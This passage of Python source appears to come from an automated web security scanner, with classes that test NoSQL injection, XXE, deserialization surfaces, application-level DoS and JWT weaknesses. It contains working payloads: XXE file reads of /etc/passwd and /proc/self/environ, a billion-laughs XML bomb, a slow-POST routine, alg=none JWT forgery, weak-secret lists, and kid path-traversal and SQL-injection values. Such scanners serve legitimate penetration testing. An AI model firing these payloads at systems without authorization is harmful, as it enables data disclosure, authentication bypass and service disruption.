                result = await self._send(url, "GET", injected)
                if result is None:
                    continue
                t_status, t_len, req_dump, resp_dump = result
                finding = self._detect_nosqli(
                    b_status, b_len, t_status, t_len,
                    url, param, f"qs_{payload_name}", payload_suffix,
                    req_dump, resp_dump,
                )
                if finding:
                    findings.append(finding)
                await asyncio.sleep(self._RATE_LIMIT)

        return findings

    def _detect_nosqli(
        self, b_status: int, b_len: int, t_status: int, t_len: int,
        url: str, param: str, payload_type: str, payload: str,
        req_dump: str, resp_dump: str,
    ) -> dict[str, Any] | None:
        score = 0
        detail_parts: list[str] = []

        # Auth bypass: 401/403 → 200
        if b_status in (401, 403) and t_status == 200:
            score = 5
            detail_parts.append(f"Auth bypass: {b_status}→{t_status}")
        # Data extraction: response >30% larger
        elif b_len > 0 and t_len > b_len * 1.3:
            score = 5
            detail_parts.append(
                f"Data extraction: response {t_len}B vs baseline {b_len}B "
                f"(+{round((t_len - b_len) / b_len * 100)}%)"
            )
        # Blind acceptance: different status
        elif b_status != t_status and t_status < 500:
            score = 4
            detail_parts.append(f"Status diff: {b_status}→{t_status}")

        if score == 0:
            return None

        return {
            "endpoint": url,
            "parameter": param,
            "payload_type": payload_type,
            "payload": payload,
            "detail": f"NoSQL injection via {payload_type} on '{param}': {'; '.join(detail_parts)}",
            "evidence_score": score,
            "status_code": t_status,
            "baseline_status": b_status,
            "request_dump": req_dump,
            "response_dump": resp_dump,
        }

    async def _send(
        self, url: str, method: str, params: dict,
    ) -> tuple[int, int, str, str] | None:
        try:
            self._requests_sent += 1
            resp = await self._client.request(method, url, params=params)
            req_dump = f"{method} {url}?{'&'.join(f'{k}={v}' for k, v in params.items())}"
            headers = "\n".join(f"{k}: {v}" for k, v in list(resp.headers.items())[:10])
            resp_dump = f"HTTP {resp.status_code}\n{headers}\n\n{resp.text[:500]}"
            return resp.status_code, len(resp.text), req_dump, resp_dump
        except Exception:
            return None

    async def _send_json(
        self, url: str, method: str, body: dict,
    ) -> tuple[int, int, str, str] | None:
        try:
            self._requests_sent += 1
            resp = await self._client.request(method, url, json=body)
            req_dump = f"{method} {url}\nContent-Type: application/json\n\n{json.dumps(body)[:300]}"
            headers = "\n".join(f"{k}: {v}" for k, v in list(resp.headers.items())[:10])
            resp_dump = f"HTTP {resp.status_code}\n{headers}\n\n{resp.text[:500]}"
            return resp.status_code, len(resp.text), req_dump, resp_dump
        except Exception:
            return None

    async def close(self):
        await self._client.aclose()


# ── XXE Scanner ──────────────────────────────────────────────────────


class XXEScanner:
    """Detect XML External Entity (XXE) injection — zero LLM cost.

    Phase 1: Discover endpoints that accept XML (probe with benign XML).
    Phase 2: Test with XXE payloads (file read, parameter entity, XInclude, SVG).
    """

    _FILE_PAYLOADS: list[tuple[str, str | None]] = [
        ("file:///etc/passwd", r"root:x:0:0:"),
        ("file:///etc/hostname", None),
        ("file:///proc/self/environ", r"PATH=|HOME="),
        ("file:///FLAG", None),
    ]

    _XXE_TEMPLATES: dict[str, str] = {
        "basic": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{uri}">]>'
            '<root><data>&xxe;</data></root>'
        ),
        "parameter": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{uri}">%xxe;]>'
            '<root><data>test</data></root>'
        ),
        "xinclude": (
            '<root xmlns:xi="http://www.w3.org/2001/XInclude">'
            '<xi:include href="{uri}" parse="text"/></root>'
        ),
        "svg": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{uri}">]>'
            '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
            '<text x="0" y="20">&xxe;</text></svg>'
        ),
    }

    _XML_CONTENT_TYPES = [
        "application/xml", "text/xml", "application/soap+xml",
    ]

    _XML_PARSER_RE = re.compile(
        r"xerces|expat|libxml|SAXParser|XMLReader|DOMParser|lxml|simplexml|xml\.etree",
        re.IGNORECASE,
    )

    _BENIGN_XML = '<?xml version="1.0"?><root><data>test</data></root>'
    _MAX_REQUESTS = 100
    _MAX_ENDPOINTS = 20

    def __init__(self, scope_guard: ActiveScopeGuard, timeout: int = 10,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._client = _make_client(
            socks_proxy=socks_proxy, timeout=timeout, follow_redirects=False,
        )
        self._requests_sent = 0

    async def scan(
        self,
        base_url: str,
        endpoints: dict[str, dict[str, Any]] | None = None,
    ) -> dict[str, Any]:
        start = time.monotonic()
        findings: list[dict[str, Any]] = []
        endpoints_tested = 0

        # Collect candidate URLs
        candidates: list[str] = []
        if endpoints:
            for url in endpoints:
                if self._scope_guard.is_in_scope(url):
                    candidates.append(url)
        if not candidates:
            candidates = [base_url]
        candidates = candidates[: self._MAX_ENDPOINTS]

        # Phase 1: Discover XML-accepting endpoints
        xml_endpoints: list[str] = []
        for url in candidates:
            if self._requests_sent >= self._MAX_REQUESTS:
                break
            if await self._probe_xml_acceptance(url):
                xml_endpoints.append(url)

        # Phase 2: Test XXE on accepting endpoints
        for url in xml_endpoints:
            if self._requests_sent >= self._MAX_REQUESTS:
                break
            endpoints_tested += 1
            ep_findings = await self._test_xxe(url)
            findings.extend(ep_findings)

        elapsed = round(time.monotonic() - start, 1)
        logger.info("xxe_scan_complete", endpoints_tested=endpoints_tested,
                     requests_sent=self._requests_sent, findings=len(findings),
                     elapsed=elapsed)
        return {
            "findings": findings,
            "endpoints_tested": endpoints_tested,
            "requests_sent": self._requests_sent,
            "elapsed_seconds": elapsed,
        }

    async def _probe_xml_acceptance(self, url: str) -> bool:
        """Send benign XML to see if endpoint accepts it (not 415)."""
        for ct in self._XML_CONTENT_TYPES:
            if self._requests_sent >= self._MAX_REQUESTS:
                return False
            try:
                self._requests_sent += 1
                resp = await self._client.post(
                    url, content=self._BENIGN_XML,
                    headers={"Content-Type": ct},
                )
                if resp.status_code != 415:  # Not Unsupported Media Type
                    return True
            except Exception:
                pass
        return False

    async def _test_xxe(self, url: str) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []
        for tmpl_name, tmpl in self._XXE_TEMPLATES.items():
            for file_uri, detect_re in self._FILE_PAYLOADS:
                if self._requests_sent >= self._MAX_REQUESTS:
                    return findings
                payload = tmpl.replace("{uri}", file_uri)
                try:
                    self._requests_sent += 1
                    resp = await self._client.post(
                        url, content=payload,
                        headers={"Content-Type": "application/xml"},
                    )
                except Exception:
                    continue

                score = 0
                detail_parts: list[str] = []
                body = resp.text

                # Check for file contents
                if detect_re and re.search(detect_re, body):
                    score = 5
                    detail_parts.append(f"File contents ({file_uri}) found in response")
                elif file_uri == "file:///FLAG" and len(body) > 10 and "error" not in body.lower():
                    score = 5
                    detail_parts.append("FLAG file content returned")
                # Check parser name in error
                elif self._XML_PARSER_RE.search(body):
                    score = 3
                    match = self._XML_PARSER_RE.search(body)
                    detail_parts.append(f"XML parser name exposed: {match.group() if match else '?'}")

                if score == 0:
                    continue

                req_dump = (
                    f"POST {url}\nContent-Type: application/xml\n\n"
                    f"{payload[:400]}"
                )
                headers = "\n".join(f"{k}: {v}" for k, v in list(resp.headers.items())[:10])
                resp_dump = f"HTTP {resp.status_code}\n{headers}\n\n{body[:500]}"

                findings.append({
                    "endpoint": url,
                    "xxe_type": tmpl_name,
                    "file_target": file_uri,
                    "detail": f"XXE ({tmpl_name}) reading {file_uri}: {'; '.join(detail_parts)}",
                    "evidence_score": score,
                    "status_code": resp.status_code,
                    "request_dump": req_dump,
                    "response_dump": resp_dump,
                })

                if score == 5:
                    break  # Early exit on confirmed file read
            # If we found a score-5 on this template, skip other templates for this EP
            if findings and findings[-1]["evidence_score"] == 5 and findings[-1]["endpoint"] == url:
                break

        return findings

    async def close(self):
        await self._client.aclose()


# ── Deserialization Scanner ──────────────────────────────────────────


class DeserializationScanner:
    """Detect insecure deserialization patterns — zero LLM cost, DETECTION ONLY.

    Scans cookies, proxy traffic, and HTTP responses for serialized object
    patterns (Java, PHP, .NET ViewState, Python pickle, Node, YAML).
    Does NOT send exploitation payloads — only identifies surfaces.
    """

    _PATTERNS: list[tuple[str, str, re.Pattern]] = [
        ("java_serialized", "Java serialized object",
         re.compile(r"rO0AB[A-Za-z0-9+/=]{10,}|aced0005[0-9a-f]{10,}", re.IGNORECASE)),
        ("php_serialized", "PHP serialized object",
         re.compile(r'[OaCis]:\d+:', re.IGNORECASE)),
        ("dotnet_viewstate", ".NET ViewState",
         re.compile(r'/wEP[A-Za-z0-9+/=]{20,}')),
        ("python_pickle", "Python pickle",
         re.compile(r'gASV[A-Za-z0-9+/=]{10,}')),
        ("node_serialize", "Node.js serialize",
         re.compile(r'_\$\$ND_FUNC\$\$_')),
        ("yaml_unsafe", "Unsafe YAML tag",
         re.compile(r'!!python/|!!ruby/|!!java/')),
        ("java_content_type", "Java serialization Content-Type",
         re.compile(r'application/x-java-serialized-object', re.IGNORECASE)),
    ]

    _VIEWSTATE_UNPROTECTED_RE = re.compile(
        r'__VIEWSTATE[^>]*value="([^"]{20,})"[^>]*(?!__VIEWSTATEGENERATOR)',
        re.IGNORECASE,
    )

    _MAX_PAGES = 15

    def __init__(self, scope_guard: ActiveScopeGuard, timeout: int = 10,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._client = _make_client(
            socks_proxy=socks_proxy, timeout=timeout, follow_redirects=True,
        )

    async def scan(
        self,
        base_url: str,
        endpoints: dict[str, dict[str, Any]] | None = None,
        proxy_traffic: list[dict[str, Any]] | None = None,
        cookies: dict[str, str] | None = None,
    ) -> dict[str, Any]:
        start = time.monotonic()
        findings: list[dict[str, Any]] = []
        endpoints_tested = 0

        # Phase 1: Check cookies
        if cookies:
            findings.extend(self._scan_cookies(cookies, base_url))

        # Phase 2: Check proxy traffic
        if proxy_traffic:
            seen_urls: set[str] = set()
            for entry in proxy_traffic[:200]:
                url = entry.get("url", "")
                if url in seen_urls:
                    continue
                seen_urls.add(url)
                # Check request body
                body = entry.get("request_body") or entry.get("body") or ""
                if body:
                    findings.extend(self._scan_text(body, f"request_body:{url}",
                                                    controllable=True))
                # Check response body
                resp_body = entry.get("response_body") or ""
                if resp_body:
                    findings.extend(self._scan_text(resp_body, f"response:{url}",
                                                    controllable=False))
                # Check response headers for content-type
                resp_headers = entry.get("response_headers") or {}
                ct = resp_headers.get("content-type", "")
                if "x-java-serialized" in ct.lower():
                    findings.append({
                        "endpoint": url,
                        "format": "java_content_type",
                        "location": "response_header",
                        "detail": f"Java serialization Content-Type in response: {ct}",
                        "evidence_score": 4,
                        "matched_value": ct,
                        "controllable": False,
                    })

        # Phase 3: Fetch pages and check responses + forms
        candidates: list[str] = []
        if endpoints:
            for url in endpoints:
                if self._scope_guard.is_in_scope(url):
                    candidates.append(url)
        if not candidates:
            candidates = [base_url]
        candidates = candidates[: self._MAX_PAGES]

        for url in candidates:
            endpoints_tested += 1
            try:
                resp = await self._client.get(url)
                body = resp.text

                # Check response body
                findings.extend(self._scan_text(body, f"page:{url}", controllable=False))

                # Check ViewState protection
                vs_finding = self._check_viewstate_protection(body, url)
                if vs_finding:
                    findings.append(vs_finding)

                # Check Set-Cookie headers
                for cookie_val in resp.headers.get_list("set-cookie"):
                    findings.extend(self._scan_text(
                        cookie_val, f"set-cookie:{url}", controllable=True,
                    ))
            except Exception:
                continue

        elapsed = round(time.monotonic() - start, 1)
        logger.info("deser_scan_complete", endpoints_tested=endpoints_tested,
                     findings=len(findings), elapsed=elapsed)
        return {
            "findings": findings,
            "endpoints_tested": endpoints_tested,
            "requests_sent": endpoints_tested,
            "elapsed_seconds": elapsed,
        }

    def _scan_text(
        self, text: str, source_label: str, controllable: bool = False,
    ) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []
        for fmt_name, fmt_desc, pattern in self._PATTERNS:
            match = pattern.search(text)
            if match:
                results.append({
                    "endpoint": source_label,
                    "format": fmt_name,
                    "location": source_label.split(":")[0],
                    "detail": f"{fmt_desc} detected in {source_label}",
                    "evidence_score": 4 if controllable else 3,
                    "matched_value": match.group()[:100],
                    "controllable": controllable,
                })
        return results

    def _scan_cookies(
        self, cookies: dict[str, str], base_url: str,
    ) -> list[dict[str, Any]]:
        import base64
        results: list[dict[str, Any]] = []
        for name, value in cookies.items():
            # Check raw value
            for fmt_name, fmt_desc, pattern in self._PATTERNS:
                if pattern.search(value):
                    results.append({
                        "endpoint": base_url,
                        "format": fmt_name,
                        "location": f"cookie:{name}",
                        "detail": f"{fmt_desc} in cookie '{name}'",
                        "evidence_score": 4,
                        "matched_value": value[:100],
                        "controllable": True,
                    })
            # Try base64 decode
            try:
                decoded = base64.b64decode(value + "==").decode("utf-8", errors="replace")
                for fmt_name, fmt_desc, pattern in self._PATTERNS:
                    if pattern.search(decoded):
                        results.append({
                            "endpoint": base_url,
                            "format": fmt_name,
                            "location": f"cookie_b64:{name}",
                            "detail": f"{fmt_desc} in base64-decoded cookie '{name}'",
                            "evidence_score": 4,
                            "matched_value": decoded[:100],
                            "controllable": True,
                        })
            except Exception:
                pass
        return results

    def _check_viewstate_protection(
        self, html: str, url: str,
    ) -> dict[str, Any] | None:
        match = self._VIEWSTATE_UNPROTECTED_RE.search(html)
        if not match:
            return None
        # Check if __VIEWSTATEGENERATOR or __EVENTVALIDATION present (MAC protection)
        if "__VIEWSTATEGENERATOR" in html or "__EVENTVALIDATION" in html:
            return None
        return {
            "endpoint": url,
            "format": "dotnet_viewstate_unprotected",
            "location": "form_field",
            "detail": f"Unprotected .NET ViewState (no MAC) on {url}",
            "evidence_score": 4,
            "matched_value": match.group(1)[:80],
            "controllable": True,
        }

    async def close(self):
        await self._client.aclose()


# ── Application-Level DoS Scanner ────────────────────────────────────


class AppLevelDoSScanner:
    """Detect application-level Denial of Service vectors — zero LLM cost.

    Tests: ReDoS payloads, XML bomb (safe 4-level), GraphQL depth query,
    deeply nested JSON, slow POST.  Compares response times against
    baseline to identify slowdowns.  Safety: 10s timeout per test, max 90
    requests, 4-level XML bomb produces ~10K entities (safe).
    """

    _REDOS_PAYLOADS: list[tuple[str, str]] = [
        ("email", "a" * 50 + "@" + "a" * 50 + ".com" + "!" * 10),
        ("nested_quantifier", "a" * 30 + "!" * 10),
        ("backtracking", "a" * 25 + "b"),
        ("url", "http://" + "a" * 50 + "." * 20),
    ]

    _XML_BOMB = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE lolz ['
        '<!ENTITY lol "lol">'
        '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
        '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
        '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">'
        ']>'
        '<root>&lol4;</root>'
    )

    _NESTED_JSON_DEPTH = 500
    _SLOWDOWN_THRESHOLD = 5.0
    _MODERATE_THRESHOLD = 3.0
    _MAX_REQUESTS = 90

    def __init__(self, scope_guard: ActiveScopeGuard, timeout: int = 10,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._client = _make_client(
            socks_proxy=socks_proxy, timeout=timeout, follow_redirects=False,
        )
        self._requests_sent = 0

    async def scan(
        self,
        base_url: str,
        endpoints: dict[str, dict[str, Any]] | None = None,
        graphql_url: str | None = None,
    ) -> dict[str, Any]:
        start = time.monotonic()
        findings: list[dict[str, Any]] = []
        endpoints_tested = 0

        # Get baseline timing
        baseline_ms = await self._get_baseline(base_url)
        if baseline_ms is None:
            baseline_ms = 200.0  # Fallback

        # Collect test targets
        targets: list[str] = []
        if endpoints:
            for url in endpoints:
                if self._scope_guard.is_in_scope(url):
                    targets.append(url)
        if not targets:
            targets = [base_url]
        targets = targets[:10]

        # Test ReDoS on endpoints with parameters
        for url in targets:
            if self._requests_sent >= self._MAX_REQUESTS:
                break
            params = {}
            if endpoints and url in endpoints:
                params = endpoints[url].get("params") or {}
            if params:
                endpoints_tested += 1
                f = await self._test_redos(url, params, baseline_ms)
                findings.extend(f)

        # Test XML bomb on first few endpoints
        for url in targets[:3]:
            if self._requests_sent >= self._MAX_REQUESTS:
                break
            endpoints_tested += 1
            f = await self._test_xml_bomb(url, baseline_ms)
            if f:
                findings.append(f)

        # Test GraphQL depth
        if graphql_url and self._requests_sent < self._MAX_REQUESTS:
            endpoints_tested += 1
            f = await self._test_graphql_depth(graphql_url, baseline_ms)
            if f:
                findings.append(f)

        # Test nested JSON
        for url in targets[:3]:
            if self._requests_sent >= self._MAX_REQUESTS:
                break
            endpoints_tested += 1
            f = await self._test_json_nesting(url, baseline_ms)
            if f:
                findings.append(f)

        # Test slow POST (connection hold)
        for url in targets[:2]:
            if self._requests_sent >= self._MAX_REQUESTS:
                break
            endpoints_tested += 1
            f = await self._test_slow_post(url)
            if f:
                findings.append(f)

        elapsed = round(time.monotonic() - start, 1)
        logger.info("dos_scan_complete", endpoints_tested=endpoints_tested,
                     requests_sent=self._requests_sent, findings=len(findings),
                     elapsed=elapsed)
        return {
            "findings": findings,
            "endpoints_tested": endpoints_tested,
            "requests_sent": self._requests_sent,
            "elapsed_seconds": elapsed,
        }

    async def _get_baseline(self, url: str) -> float | None:
        """Average response time over 3 requests (ms)."""
        times: list[float] = []
        for _ in range(3):
            if self._requests_sent >= self._MAX_REQUESTS:
                break
            try:
                self._requests_sent += 1
                t0 = time.monotonic()
                await self._client.get(url)
                times.append((time.monotonic() - t0) * 1000)
            except Exception:
                pass
        return sum(times) / len(times) if times else None

    async def _test_redos(
        self, url: str, params: dict, baseline_ms: float,
    ) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []
        text_params = [p for p in params if isinstance(params.get(p), str) or params.get(p) is None]
        if not text_params:
            text_params = list(params.keys())[:2]

        for param in text_params[:2]:
            for dos_name, payload in self._REDOS_PAYLOADS:
                if self._requests_sent >= self._MAX_REQUESTS:
                    return findings
                injected = dict(params)
                injected[param] = payload
                try:
                    self._requests_sent += 1
                    t0 = time.monotonic()
                    resp = await self._client.get(url, params=injected)
                    test_ms = (time.monotonic() - t0) * 1000
                except httpx.TimeoutException:
                    test_ms = 10000.0
                    resp = None
                except Exception:
                    continue

                ratio = test_ms / max(baseline_ms, 1)
                if ratio >= self._MODERATE_THRESHOLD:
                    score = 4 if ratio >= self._SLOWDOWN_THRESHOLD else 3
                    req_dump = f"GET {url}?{param}={payload[:80]}"
                    resp_dump = ""
                    if resp:
                        resp_dump = f"HTTP {resp.status_code} ({test_ms:.0f}ms vs {baseline_ms:.0f}ms baseline)"
                    else:
                        resp_dump = f"TIMEOUT ({test_ms:.0f}ms vs {baseline_ms:.0f}ms baseline)"
                    findings.append({
                        "endpoint": url,
                        "dos_type": f"redos_{dos_name}",
                        "detail": f"ReDoS ({dos_name}) on param '{param}': {ratio:.1f}x slowdown",
                        "evidence_score": score,
                        "status_code": resp.status_code if resp else 0,
                        "baseline_time_ms": round(baseline_ms, 1),
                        "test_time_ms": round(test_ms, 1),
                        "slowdown_ratio": round(ratio, 1),
                        "request_dump": req_dump,
                        "response_dump": resp_dump,
                    })
        return findings

    async def _test_xml_bomb(
        self, url: str, baseline_ms: float,
    ) -> dict[str, Any] | None:
        try:
            self._requests_sent += 1
            t0 = time.monotonic()
            resp = await self._client.post(
                url, content=self._XML_BOMB,
                headers={"Content-Type": "application/xml"},
            )
            test_ms = (time.monotonic() - t0) * 1000
        except httpx.TimeoutException:
            test_ms = 10000.0
            resp = None
        except Exception:
            return None

        ratio = test_ms / max(baseline_ms, 1)
        if ratio < self._MODERATE_THRESHOLD:
            return None

        score = 4 if ratio >= self._SLOWDOWN_THRESHOLD else 3
        return {
            "endpoint": url,
            "dos_type": "xml_bomb",
            "detail": f"XML bomb (billion laughs level 4): {ratio:.1f}x slowdown",
            "evidence_score": score,
            "status_code": resp.status_code if resp else 0,
            "baseline_time_ms": round(baseline_ms, 1),
            "test_time_ms": round(test_ms, 1),
            "slowdown_ratio": round(ratio, 1),
            "request_dump": f"POST {url}\nContent-Type: application/xml\n\n{self._XML_BOMB[:200]}",
            "response_dump": f"{'HTTP ' + str(resp.status_code) if resp else 'TIMEOUT'} ({test_ms:.0f}ms)",
        }

    async def _test_graphql_depth(
        self, graphql_url: str, baseline_ms: float,
    ) -> dict[str, Any] | None:
        # Build 50-deep nested __typename query
        query = "{ __typename " + "{ __typename " * 49 + "}" * 49 + "}"
        try:
            self._requests_sent += 1
            t0 = time.monotonic()
            resp = await self._client.post(
                graphql_url,
                json={"query": query},
                headers={"Content-Type": "application/json"},
            )
            test_ms = (time.monotonic() - t0) * 1000
        except httpx.TimeoutException:
            test_ms = 10000.0
            resp = None
        except Exception:
            return None

        ratio = test_ms / max(baseline_ms, 1)
        if ratio < self._MODERATE_THRESHOLD:
            return None

        score = 4 if ratio >= self._SLOWDOWN_THRESHOLD else 3
        return {
            "endpoint": graphql_url,
            "dos_type": "graphql_depth",
            "detail": f"GraphQL depth query (50 levels): {ratio:.1f}x slowdown",
            "evidence_score": score,
            "status_code": resp.status_code if resp else 0,
            "baseline_time_ms": round(baseline_ms, 1),
            "test_time_ms": round(test_ms, 1),
            "slowdown_ratio": round(ratio, 1),
            "request_dump": f"POST {graphql_url}\n\n{{query: depth=50}}",
            "response_dump": f"{'HTTP ' + str(resp.status_code) if resp else 'TIMEOUT'} ({test_ms:.0f}ms)",
        }

    async def _test_slow_post(
        self, url: str,
    ) -> dict[str, Any] | None:
        """Send body 1 byte per 2 seconds, check if server holds connection."""
        import socket
        from urllib.parse import urlparse

        parsed = urlparse(url)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"

        try:
            self._requests_sent += 1
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((host, port))

            # Send partial HTTP POST headers with large Content-Length
            header = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 100000\r\n"
                f"\r\n"
            )
            if parsed.scheme == "https":
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            sock.sendall(header.encode())

            # Send 1 byte every 2s, check if connection stays open
            t0 = time.monotonic()
            bytes_sent = 0
            held_seconds = 0.0
            for _ in range(5):  # 10 seconds max
                await asyncio.sleep(2)
                try:
                    sock.sendall(b"A")
                    bytes_sent += 1
                except (BrokenPipeError, ConnectionResetError, OSError):
                    break
            held_seconds = time.monotonic() - t0
            sock.close()

            if held_seconds >= 8.0:
                return {
                    "endpoint": url,
                    "dos_type": "slow_post",
                    "detail": f"Server held connection for {held_seconds:.1f}s with slow POST (1 byte/2s)",
                    "evidence_score": 4 if held_seconds >= 10.0 else 3,
                    "status_code": 0,
                    "baseline_time_ms": 0,
                    "test_time_ms": round(held_seconds * 1000, 1),
                    "slowdown_ratio": 0,
                    "request_dump": f"POST {path} (slow body: {bytes_sent} bytes in {held_seconds:.1f}s)",
                    "response_dump": f"Connection held {held_seconds:.1f}s",
                }
            return None
        except Exception:
            return None

    async def _test_json_nesting(
        self, url: str, baseline_ms: float,
    ) -> dict[str, Any] | None:
        nested = "x"
        for _ in range(self._NESTED_JSON_DEPTH):
            nested = {"a": nested}
        try:
            self._requests_sent += 1
            t0 = time.monotonic()
            resp = await self._client.post(
                url, json=nested,
                headers={"Content-Type": "application/json"},
            )
            test_ms = (time.monotonic() - t0) * 1000
        except httpx.TimeoutException:
            test_ms = 10000.0
            resp = None
        except Exception:
            return None

        ratio = test_ms / max(baseline_ms, 1)
        if ratio < self._MODERATE_THRESHOLD:
            return None

        score = 4 if ratio >= self._SLOWDOWN_THRESHOLD else 3
        return {
            "endpoint": url,
            "dos_type": "json_nesting",
            "detail": f"Nested JSON ({self._NESTED_JSON_DEPTH} levels): {ratio:.1f}x slowdown",
            "evidence_score": score,
            "status_code": resp.status_code if resp else 0,
            "baseline_time_ms": round(baseline_ms, 1),
            "test_time_ms": round(test_ms, 1),
            "slowdown_ratio": round(ratio, 1),
            "request_dump": f"POST {url}\nContent-Type: application/json\n\n{{depth: {self._NESTED_JSON_DEPTH}}}",
            "response_dump": f"{'HTTP ' + str(resp.status_code) if resp else 'TIMEOUT'} ({test_ms:.0f}ms)",
        }

    async def close(self):
        await self._client.aclose()


# ── JWT Deep Analyzer ────────────────────────────────────────────────


class JWTDeepAnalyzer:
    """Deep JWT security analysis — zero LLM cost (offline tests), minimal
    network for active tests.

    Tests: none algorithm, alg confusion (RS256→HS256), weak secret
    brute-force (20 common secrets, offline), expired token acceptance,
    kid header injection (path traversal + SQLi).
    """

    _WEAK_SECRETS: list[str] = [
        "secret", "password", "123456", "admin", "key", "jwt_secret",
        "changeme", "test", "default", "pass", "letmein", "qwerty",
        "abc123", "password1", "iloveyou", "welcome", "monkey",
        "master", "dragon", "login",
    ]

    _KID_INJECTIONS: list[tuple[str, str]] = [
        ("null_file", "/dev/null"),
        ("passwd_traversal", "../../../../../../etc/passwd"),
        ("environ_traversal", "../../../../../../proc/self/environ"),
        ("sqli", "' UNION SELECT 'secret' -- "),
    ]

    def __init__(self, scope_guard: ActiveScopeGuard | None = None,
                 timeout: int = 10, socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._client = _make_client(
            socks_proxy=socks_proxy, timeout=timeout, follow_redirects=False,
        )

    async def analyze(
        self,
        token: str,
        target_url: str | None = None,
        cookies: dict[str, str] | None = None,
    ) -> dict[str, Any]:
        start = time.monotonic()
        findings: list[dict[str, Any]] = []

        # Decode JWT
        parts = token.split(".")
        if len(parts) < 2:
            return {"findings": [], "error": "Invalid JWT format",
                    "elapsed_seconds": round(time.monotonic() - start, 1)}

        header = self._decode_part(parts[0])
        payload = self._decode_part(parts[1])
        if header is None or payload is None:
            return {"findings": [], "error": "Failed to decode JWT",
                    "elapsed_seconds": round(time.monotonic() - start, 1)}

        original_alg = header.get("alg", "unknown")

        # Test 1: none algorithm (needs network)
        if target_url:
            f = await self._test_none_algorithm(header, payload, target_url, cookies)
            if f:
                findings.append(f)

        # Test 2: alg confusion RS256 → HS256 (needs network)
        if target_url and original_alg.startswith("RS"):
            f = await self._test_alg_confusion(header, payload, target_url, cookies)
            if f:
                findings.append(f)

        # Test 3: weak secrets (OFFLINE — no network)
        f = self._test_weak_secrets(token, header, payload, original_alg)
        if f:
            findings.append(f)

        # Test 4: expired token (needs network)
        if target_url:
            f = await self._test_expired_token(header, payload, target_url, cookies)
            if f:
                findings.append(f)

        # Test 5: kid injection (needs network)
        if target_url and "kid" in header:
            kid_findings = await self._test_kid_injection(
                header, payload, target_url, cookies, original_alg,
            )
            findings.extend(kid_findings)

        elapsed = round(time.monotonic() - start, 1)
        logger.info("jwt_deep_complete", findings=len(findings),
                     original_alg=original_alg, elapsed=elapsed)
        return {
            "findings": findings,
            "original_algorithm": original_alg,
            "header": header,
            "payload": payload,
            "elapsed_seconds": elapsed,
        }

    def _decode_part(self, part: str) -> dict[str, Any] | None:
        import base64
        try:
            padded = part + "=" * (4 - len(part) % 4)
            decoded = base64.urlsafe_b64decode(padded)
            return json.loads(decoded)
        except Exception:
            return None

    def _build_jwt(
        self, header: dict, payload: dict, secret: str, algorithm: str = "HS256",
    ) -> str:
        import base64
        import hashlib
        import hmac

        def b64url(data: bytes) -> str:
            return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

        h = b64url(json.dumps(header, separators=(",", ":")).encode())
        p = b64url(json.dumps(payload, separators=(",", ":")).encode())
        signing_input = f"{h}.{p}"

        if algorithm == "none":
            return f"{signing_input}."

        if algorithm in ("HS256", "HS384", "HS512"):
            hash_func = {
                "HS256": hashlib.sha256,
                "HS384": hashlib.sha384,
                "HS512": hashlib.sha512,
            }[algorithm]
            sig = hmac.new(
                secret.encode(), signing_input.encode(), hash_func,
            ).digest()
            return f"{signing_input}.{b64url(sig)}"

        return f"{signing_input}."

    async def _send_jwt(
        self, token: str, target_url: str, cookies: dict[str, str] | None,
    ) -> httpx.Response | None:
        """Send JWT via Authorization header, then try common cookie names."""
        # Try Bearer header first
        try:
            resp = await self._client.get(
                target_url,
                headers={"Authorization": f"Bearer {token}"},
                cookies=cookies,
            )
            if resp.status_code not in (401, 403):
                return resp
        except Exception:
            pass

        # Try common JWT cookie names
        for cookie_name in ("token", "jwt", "session", "access_token", "auth"):
            try:
                jar = dict(cookies or {})
                jar[cookie_name] = token
                resp = await self._client.get(target_url, cookies=jar)
                if resp.status_code not in (401, 403):
                    return resp
            except Exception:
                pass

        return None

    async def _test_none_algorithm(
        self, header: dict, payload: dict, target_url: str,
        cookies: dict[str, str] | None,
    ) -> dict[str, Any] | None:
        forged_header = dict(header)
        forged_header["alg"] = "none"
        token = self._build_jwt(forged_header, payload, "", "none")
        resp = await self._send_jwt(token, target_url, cookies)
        if resp and resp.status_code == 200:
            req_dump = f"GET {target_url}\nAuthorization: Bearer {token[:80]}..."
            headers = "\n".join(f"{k}: {v}" for k, v in list(resp.headers.items())[:10])
            return {
                "endpoint": target_url,
                "jwt_attack": "none_algorithm",
                "detail": "JWT with alg=none accepted — authentication bypass",
                "evidence_score": 5,
                "cracked_secret": "",
                "original_algorithm": header.get("alg", "?"),
                "request_dump": req_dump,
                "response_dump": f"HTTP {resp.status_code}\n{headers}\n\n{resp.text[:300]}",
            }
        return None

    async def _test_alg_confusion(
        self, header: dict, payload: dict, target_url: str,
        cookies: dict[str, str] | None,
    ) -> dict[str, Any] | None:
        forged_header = dict(header)
